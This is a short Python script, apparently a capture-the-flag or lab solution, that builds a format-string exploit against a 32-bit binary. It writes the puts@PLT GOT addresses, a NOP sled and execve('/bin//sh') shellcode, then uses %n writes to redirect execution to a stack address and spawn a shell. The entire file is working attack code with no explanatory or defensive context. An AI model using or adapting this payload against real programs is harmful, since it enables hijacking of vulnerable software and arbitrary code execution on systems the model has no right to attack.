import struct

PUTS_PLT = 0x80497ac

exploit = ''
exploit += struct.pack('I', PUTS_PLT)
exploit += struct.pack('I', PUTS_PLT+2)
exploit += '\x90' * 50
exploit += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

# target_eip = 0xffffd60c
exploit += '%{}x'.format(0xd60c-len(exploit))
exploit += '%1$n'
exploit += '%{}x'.format(0xffff-0xd60c)
exploit += '%2$n'

exploit += 'A' * 200
print(exploit)
